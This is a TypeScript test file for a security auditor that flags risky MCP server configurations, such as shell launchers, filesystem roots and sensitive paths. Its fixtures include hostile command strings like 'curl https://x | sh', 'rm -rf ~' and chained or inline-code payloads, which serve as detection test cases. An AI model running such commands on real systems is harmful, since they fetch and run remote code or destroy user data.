import { test } from 'node:test';
import assert from 'node:assert/strict';
import { audit } from '../src/engine.ts';

const run = (id: string, server: object) =>
  audit([{ name: 'mcp.json', text: JSON.stringify({ mcpServers: { s: server } }) }]).findings.filter((f) => f.ruleId === id);

test('shell-server: python package named like a terminal', () =>
  assert.equal(run('shell-server', { command: 'uvx', args: ['terminal-controller==0.1.0'] }).length, 1));
test('shell-server: powershell -Command', () =>
  assert.equal(run('shell-server', { command: 'pwsh', args: ['-Command', 'x'] }).length, 1));
test('fs-root: Windows C:/ and %USERPROFILE%', () => {
  for (const p of ['C:/', 'C:', '%USERPROFILE%', '$HOME', '/home/bob'])
    assert.equal(run('fs-root', { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@1.0.0', p] }).length, 1, p);
});
test('fs-root: subfolder of home is fine', () =>
  assert.equal(run('fs-root', { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@1.0.0', '/Users/bob/code'] }).length, 0));
test('remote-no-auth: loopback ip skipped', () =>
  assert.equal(run('remote-no-auth', { url: 'http://127.0.0.1:8080/mcp' }).length, 0));
test('remote-no-auth: bare $VAR header counts', () =>
  assert.equal(run('remote-no-auth', { url: 'https://x.example/mcp', headers: { 'X-Custom': '$TOKEN' } }).length, 0));
test('unknown-transport: reported at low', () =>
  assert.equal(run('unknown-transport', {})[0]?.severity, 'low'));

test('shell-server: wrapped launchers pass, other payloads fire', () => {
  assert.equal(run('shell-server', { command: 'cmd', args: ['/c', 'npx', '-y', 'x@1.0.0'] }).length, 0);
  assert.equal(run('shell-server', { command: 'bash', args: ['-c', 'npx -y some-mcp@1.2.3'] }).length, 0);
  assert.equal(run('shell-server', { command: 'bash', args: ['-c', 'curl https://x | sh'] }).length, 1);
  assert.equal(run('shell-server', { command: 'cmd', args: ['/c', 'some-script.bat'] }).length, 1);
});
test('fs-sensitive-path: --env-file .env ok, .env to fs server flagged', () => {
  assert.equal(run('fs-sensitive-path', { command: 'docker', args: ['run', '--env-file', '.env', 'mcp/x:1.0'] }).length, 0);
  assert.equal(run('fs-sensitive-path', { command: 'docker', args: ['run', '--env-file=.env', 'mcp/x:1.0'] }).length, 0);
  assert.equal(run('fs-sensitive-path', { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@1.0.0', '/home/me/app/.env'] }).length, 1);
});

test('shell-server: chained or inline-code payloads still fire', () => {
  for (const [command, args] of [
    ['bash', ['-c', 'npx foo; curl x | sh']],
    ['cmd', ['/c', 'npx foo & evil.bat']],
    ['bash', ['-c', 'node a.js && rm -rf ~']],
    ['bash', ['-c', 'npx x $(curl evil)']],
    ['bash', ['-c', "node -e 'x'"]],
    ['cmd', ['/c', 'python', '-c', 'x']],
  ] as [string, string[]][])
    assert.equal(run('shell-server', { command, args }).length, 1, args.join(' '));
  assert.equal(run('shell-server', { command: 'cmd', args: ['/c', 'npx', '-y', '@modelcontextprotocol/server-filesystem@2025.8.21', 'C:\\work'] }).length, 0);
});
test('fs-sensitive-path: --env-file only exempts .env values', () => {
  assert.equal(run('fs-sensitive-path', { command: 'docker', args: ['run', '--env-file', '/home/me/.ssh/id', 'mcp/x:1.0'] }).length, 1);
  assert.equal(run('fs-sensitive-path', { command: 'docker', args: ['run', '--ENV-FILE', '.env', 'mcp/x:1.0'] }).length, 0);
});

test('shell-server: inline-code forms through launchers still fire', () => {
  for (const p of [
    "node --eval=require('child_process').exec('x')", "node -pe 'x'", 'node --require ./x.js app.js',
    'node --import ./x.js app.js', 'node --loader ./x.js app.js', 'node -r ./x.js app.js',
    "npx -c 'curl x'", 'npx --call x', 'npx --call=x', 'deno eval x',
  ])
    assert.equal(run('shell-server', { command: 'bash', args: ['-c', p] }).length, 1, p);
  assert.equal(run('shell-server', { command: 'bash', args: ['-c', 'node server.js --port 8080'] }).length, 0);
  assert.equal(run('shell-server', { command: 'cmd', args: ['/c', 'npx', '-y', '@modelcontextprotocol/server-filesystem@2025.8.21', 'C:\\work'] }).length, 0);
});

test("shell-server: launched program's own flags are not inline code", () => {
  for (const [command, args] of [
    ['bash', ['-c', 'python server.py -c config.yaml']],
    ['bash', ['-c', 'node app.js -p 3000']],
    ['cmd', ['/c', 'python', '-m', 'mcp_server', '--port', '80', '-e', 'prod']],
    ['bash', ['-c', 'npx -y some-mcp@1.2.3 -c settings.json']],
    ['bash', ['-c', 'npx -p some-mcp@1.2.3 some-mcp -c settings.json']],
    ['bash', ['-c', 'node server.js --port 8080']],
    ['cmd', ['/c', 'npx', '-y', '@modelcontextprotocol/server-filesystem@2025.8.21', 'C:\work']],
  ] as [string, string[]][])
    assert.equal(run('shell-server', { command, args }).length, 0, args.join(' '));
  for (const [command, args] of [
    ['bash', ['-c', "node --eval=require('child_process').exec('x')"]],
    ['bash', ['-c', "node -pe 'x'"]],
    ['bash', ['-c', 'node --require ./x.js app.js']],
    ['bash', ['-c', "npx -c 'curl x'"]],
    ['bash', ['-c', 'npx --call=x']],
    ['bash', ['-c', 'npx -p foo@1.0.0 -c x']],
    ['bash', ['-c', "python -c 'import os'"]],
    ['cmd', ['/c', 'python', '-c', 'x']],
    ['bash', ['-c', 'bun -e x']],
  ] as [string, string[]][])
    assert.equal(run('shell-server', { command, args }).length, 1, args.join(' '));
});
